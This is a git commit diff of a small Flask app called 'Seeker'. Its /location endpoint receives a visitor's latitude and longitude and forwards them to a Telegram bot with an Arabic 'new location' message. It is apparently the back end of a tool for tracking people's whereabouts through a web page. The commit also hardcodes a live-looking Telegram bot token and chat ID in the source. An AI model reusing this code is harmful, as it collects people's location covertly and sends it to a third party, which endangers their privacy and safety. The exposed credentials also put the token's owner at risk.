a588207f9969767eb1a095efdf1326eac2b146af
Mamduh-911 <132438162+Mamduh-911@users.noreply.github.com>
2025-07-23 05:46:37 +0300

    Update main.py

--- main.py
+++ main.py
@@ -1,15 +1,15 @@
-from flask import Flask, request, send_file
-import requests, os
+import requests
+from flask import Flask, request
 
 app = Flask(__name__)
 
-TOKEN = os.environ.get("TG_TOKEN")
-CHAT_ID = os.environ.get("TG_CHAT_ID")
-TG_API = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+TG_TOKEN = "7961048427:AAFjlXzCR9F7W4QK2k4S5Iw3COnZlbtlq4Y"
+CHAT_ID = "7961048427"
+TG_API = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
 
 @app.route("/")
 def index():
-    return send_file("index.html")
+    return "Seeker is running!"
 
 @app.route("/location", methods=["POST"])
 def location():
@@ -17,5 +17,7 @@ def location():
     lat = data.get("latitude")
     lon = data.get("longitude")
     msg = f"📍 موقع جديد\nخط العرض: {lat}\nخط الطول: {lon}"
-    requests.get(TG_API, params={"chat_id": CHAT_ID, "text": msg})
+    print("🚀 Sending to Telegram:", msg)
+    response = requests.get(TG_API, params={"chat_id": CHAT_ID, "text": msg})
+    print("📩 Telegram response:", response.text)
     return {"status":"تم الاستلام"}
